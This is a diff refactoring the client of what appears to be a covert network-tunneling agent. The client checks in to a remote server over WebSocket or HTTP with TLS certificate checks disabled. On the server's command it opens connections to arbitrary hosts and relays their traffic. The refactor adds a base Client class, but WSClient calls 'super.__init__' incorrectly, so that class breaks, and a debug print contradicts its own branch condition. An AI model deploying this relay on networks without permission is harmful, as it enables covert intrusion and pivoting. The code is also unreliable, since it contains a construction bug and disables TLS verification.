@@ -468,17 +468,9 @@ class MessageBuilder:
 
 ## Clients
 
-class WSClient:
-    def __init__(self, server_url, encryption_key, messenger_id, user_agent, proxy):
-        self.server_url = server_url
+class Client:
+    def __init__(self, encryption_key):
         self.encryption_key = encryption_key
-        self.headers = {'User-Agent': user_agent}
-        self.proxy = proxy
-        self.session = aiohttp.ClientSession(headers=self.headers)
-        self.ssl_context = ssl.create_default_context()
-        self.ssl_context.check_hostname = False
-        self.ssl_context.verify_mode = ssl.CERT_NONE
-        self.identifier = messenger_id
         self.forwarder_clients = {}
 
     def deserialize_messages(self, data: bytes):
@@ -488,7 +480,6 @@ class WSClient:
                 break
 
             potential_length = struct.unpack('!I', data[4:8])[0]
-
             if len(data) < potential_length:
                 break
 
@@ -498,49 +489,11 @@ class WSClient:
 
         return messages
 
-
-    async def connect(self):
-        self.ws = await self.session.ws_connect(
-            self.server_url,
-            ssl=self.ssl_context,
-            proxy=self.proxy
-        )
-        check_in_msg = self.serialize_messages([CheckInMessage(messenger_id=self.identifier)])
-        await self.ws.send_bytes(check_in_msg)
-        if self.identifier:
-            return
-        msg = await self.ws.receive()
-        messages = self.deserialize_messages(msg.data)
-        assert len(messages) > 0, f"[*] Invalid response from server:\n{msg.data}"
-        check_in_msg = messages[0]
-        assert isinstance(check_in_msg, CheckInMessage), f"Expected CheckInMessage, got {type(check_in_msg)}"
-        self.identifier = check_in_msg.messenger_id
-        print(f'Connected to {self.server_url}')
-
-    async def start(self):
-        async for msg in self.ws:
-            messages = self.deserialize_messages(msg.data)
-            for message in messages:
-                asyncio.create_task(self.handle_message(message))
-
-    async def handle_message(self, message):
-        if isinstance(message, InitiateForwarderClientReq):
-            await self.handle_initiate_forwarder_client_req({
-                "IP Address": message.ip_address,
-                "Port": message.port,
-                "Forwarder Client ID": message.forwarder_client_id
-            })
-
-        elif isinstance(message, InitiateForwarderClientRep):
-            asyncio.create_task(self.stream(message.forwarder_client_id))
-
-        elif isinstance(message, SendDataMessage):
-            forwarder_client = self.forwarder_clients.get(message.forwarder_client_id)
-            if not forwarder_client:
-                return
-            forwarder_client.writer.write(message.data)
-        else:
-            print(f"Received unknown message type: {type(message).__name__}")
+    def serialize_messages(self, messages):
+        data = b''
+        for message in messages:
+            data += MessageBuilder.serialize_message(self.encryption_key, message)
+        return data
 
     async def handle_initiate_forwarder_client_req(self, message):
         try:
@@ -598,7 +551,6 @@ class WSClient:
             address_type=1,
             reason=reason
         )
-
         await self.send_downstream_message(downstream_message)
         return
 
@@ -625,18 +577,85 @@ class WSClient:
         await self.send_downstream_message(downstream_message)
         del self.forwarder_clients[forwarder_client_identifier]
 
-    def serialize_messages(self, messages):
-        data = b''
-        for message in messages:
-            data += MessageBuilder.serialize_message(self.encryption_key, message)
-        return data
+    async def handle_message(self, message):
+        if isinstance(message, InitiateForwarderClientReq):
+            await self.handle_initiate_forwarder_client_req({
+                "IP Address": message.ip_address,
+                "Port": message.port,
+                "Forwarder Client ID": message.forwarder_client_id
+            })
+        elif isinstance(message, InitiateForwarderClientRep):
+            forwarder_client = self.forwarder_clients.get(message.forwarder_client_id)
+            if not forwarder_client:
+                return
+            if message.reason != 0:
+                print("reason zero")
+                forwarder_client.writer.close()
+                await forwarder_client.writer.wait_closed()
+                self.forwarder_clients.pop(message.forwarder_client_id, None)
+                return
+            asyncio.create_task(self.stream(message.forwarder_client_id))
+        elif isinstance(message, SendDataMessage):
+            forwarder_client = self.forwarder_clients.get(message.forwarder_client_id)
+            if not forwarder_client:
+                return
+            forwarder_client.writer.write(message.data)
+        else:
+            print(f"Received unknown message type: {type(message).__name__}")
+
+    async def connect(self):
+        raise NotImplementedError
+
+    async def start(self):
+        raise NotImplementedError
+
+    async def send_downstream_message(self, downstream_message):
+        raise NotImplementedError
+
+class WSClient(Client):
+    def __init__(self, server_url, encryption_key, messenger_id, user_agent, proxy):
+        super.__init__(encryption_key)
+        self.server_url = server_url
+        self.headers = {'User-Agent': user_agent}
+        self.proxy = proxy
+        self.session = aiohttp.ClientSession(headers=self.headers)
+        self.ssl_context = ssl.create_default_context()
+        self.ssl_context.check_hostname = False
+        self.ssl_context.verify_mode = ssl.CERT_NONE
+        self.identifier = messenger_id
+
+    async def connect(self):
+        self.ws = await self.session.ws_connect(
+            self.server_url,
+            ssl=self.ssl_context,
+            proxy=self.proxy
+        )
+        check_in_msg = self.serialize_messages([CheckInMessage(messenger_id=self.identifier)])
+        await self.ws.send_bytes(check_in_msg)
+        if self.identifier:
+            return
+        msg = await self.ws.receive()
+        messages = self.deserialize_messages(msg.data)
+        assert len(messages) > 0, f"[*] Invalid response from server:\n{msg.data}"
+        check_in_msg = messages[0]
+        assert isinstance(check_in_msg, CheckInMessage), f"Expected CheckInMessage, got {type(check_in_msg)}"
+        self.identifier = check_in_msg.messenger_id
+        print(f'Connected to {self.server_url}')
+
+    async def start(self):
+        async for msg in self.ws:
+            messages = self.deserialize_messages(msg.data)
+            for message in messages:
+                asyncio.create_task(self.handle_message(message))
 
     async def send_downstream_message(self, downstream_message):
         downstream_messages = [CheckInMessage(messenger_id=self.identifier), downstream_message]
         await self.ws.send_bytes(self.serialize_messages(downstream_messages))
+        print(len(self.forwarder_clients))
 
-class HTTPClient:
+class HTTPClient(Client):
     def __init__(self, server_url, encryption_key, messenger_id, user_agent, proxy):
+        super().__init__(encryption_key)
         self.server_url = server_url
         self.encryption_key = encryption_key
         self.headers = {'User-Agent': user_agent}
@@ -645,7 +664,6 @@ class HTTPClient:
         self.ssl_context.check_hostname = False
         self.ssl_context.verify_mode = ssl.CERT_NONE
         self.identifier = messenger_id
-        self.forwarder_clients = {}
         self.downstream_messages = asyncio.Queue()
         proxy_handler = request.ProxyHandler({
             'http': proxy,
@@ -654,28 +672,6 @@ class HTTPClient:
 
         https_handler = request.HTTPSHandler(context=self.ssl_context)
         self.opener = request.build_opener(proxy_handler, https_handler)
-
-    def deserialize_messages(self, data: bytes):
-        messages = []
-        while True:
-            if len(data) < 8:
-                break
-
-            potential_length = struct.unpack('!I', data[4:8])[0]
-
-            if len(data) < potential_length:
-                break
-
-            remaining_data, message = MessageParser.deserialize_message(self.encryption_key, data)
-            messages.append(message)
-            data = remaining_data
-
-        return messages
-
-    async def start_remote_port_forwards(self, remote_port_forwards):
-        for remote_port_forward in remote_port_forwards:
-            remote_forward = RemotePortForwarder(self, remote_port_forward)
-            await remote_forward.start()
 
     def _blocking_http_req(self, req, timeout = 10.0):
         with self.opener.open(req, timeout=timeout) as resp:
@@ -721,118 +717,9 @@ class HTTPClient:
                 asyncio.create_task(self.handle_message(message))
             await asyncio.sleep(0.1)
 
-    async def handle_message(self, message):
-        if isinstance(message, InitiateForwarderClientReq):
-            await self.handle_initiate_forwarder_client_req({
-                "IP Address": message.ip_address,
-                "Port": message.port,
-                "Forwarder Client ID": message.forwarder_client_id
-            })
-
-        elif isinstance(message, InitiateForwarderClientRep):
-            asyncio.create_task(self.stream(message.forwarder_client_id))
-
-        elif isinstance(message, SendDataMessage):
-            forwarder_client = self.forwarder_clients.get(message.forwarder_client_id)
-            if not forwarder_client:
-                return
-            forwarder_client.writer.write(message.data)
-
-        else:
-            print(f"Received unknown message type: {type(message).__name__}")
-
-    async def handle_initiate_forwarder_client_req(self, message):
-        try:
-            ip = message['IP Address']
-            port = message['Port']
-            client_id = message['Forwarder Client ID']
-
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, port),
-                timeout=5
-            )
-            self.forwarder_clients[client_id] = ForwarderClient(reader, writer)
-
-            bind_info = writer.get_extra_info("sockname")
-            bind_addr = bind_info[0]
-            bind_port = bind_info[1]
-
-            sock = writer.get_extra_info("socket")
-            family = sock.family
-            atype = 1 if family == socket.AF_INET else 4
-
-            downstream_message = InitiateForwarderClientRep(
-                forwarder_client_id=client_id,
-                bind_address=bind_addr,
-                bind_port=bind_port,
-                address_type=atype,
-                reason=0
-            )
-
-            asyncio.create_task(self.stream(client_id))
-        except socket.gaierror:
-            reason = 4
-        except socket.timeout:
-            reason = 6
-        except ConnectionRefusedError:
-            reason = 5
-        except OSError as e:
-            reason = {
-                errno.ENETUNREACH: 3,
-                errno.EHOSTUNREACH: 4,
-                errno.ECONNREFUSED: 5,
-                errno.ENOPROTOOPT: 7,
-                errno.EAFNOSUPPORT: 8
-            }.get(e.errno, 1)
-        except Exception:
-            reason = 1
-        else:
-            await self.send_downstream_message(downstream_message)
-            return
-
-        downstream_message = InitiateForwarderClientRep(
-            forwarder_client_id=message["Forwarder Client ID"],
-            bind_address="0.0.0.0",
-            bind_port=0,
-            address_type=1,
-            reason=reason
-        )
-
-        await self.send_downstream_message(downstream_message)
-        return
-
-    async def stream(self, forwarder_client_identifier):
-        forwarder_client = self.forwarder_clients[forwarder_client_identifier]
-        while True:
-            try:
-                msg = await forwarder_client.reader.read(4096)
-                if not msg:
-                    break
-
-                downstream_message = SendDataMessage(
-                    forwarder_client_id=forwarder_client_identifier,
-                    data=msg
-                )
-                await self.send_downstream_message(downstream_message)
-            except (EOFError, ConnectionResetError):
-                break
-
-        downstream_message = SendDataMessage(
-            forwarder_client_id=forwarder_client_identifier,
-            data=b''
-        )
-        await self.send_downstream_message(downstream_message)
-        del self.forwarder_clients[forwarder_client_identifier]
-
-    def serialize_messages(self, messages):
-        data = b''
-        for message in messages:
-            data += MessageBuilder.serialize_message(self.encryption_key, message)
-        return data
-
     async def send_downstream_message(self, downstream_message):
         await self.downstream_messages.put(downstream_message)
-
+        print(len(self.forwarder_clients))
 
 class RemotePortForwarder:
     def __init__(self, messenger, config):
@@ -953,7 +840,7 @@ async def main():
 
             print(f"[+] Attempting to reconnect (attempt #{attempts}/{retry_attempts})")
 
-
+{% if non_main_thread %}
 def run_coro_in_thread(coro):
     if sys.platform == "win32":
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -964,7 +851,7 @@ def run_coro_in_thread(coro):
     finally:
         loop.run_until_complete(loop.shutdown_asyncgens())
         loop.close()
-
+{% endif %}
 
 {% if non_main_thread %}
 try:
